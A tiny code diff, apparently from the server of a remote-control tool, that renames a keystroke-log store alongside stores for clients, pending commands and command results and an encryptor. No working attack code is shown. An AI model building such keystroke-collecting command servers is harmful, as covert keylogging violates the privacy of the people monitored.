@@ -15,7 +15,7 @@ clients = {}
 #In-memory storage for pending commands for clients
 pending_commands = {}
 command_results = {}
-keylogger_storage = {}
+keylogs_storage = {}
 
 encryptor = Encryptor(ENCRYPTION_KEY)
 
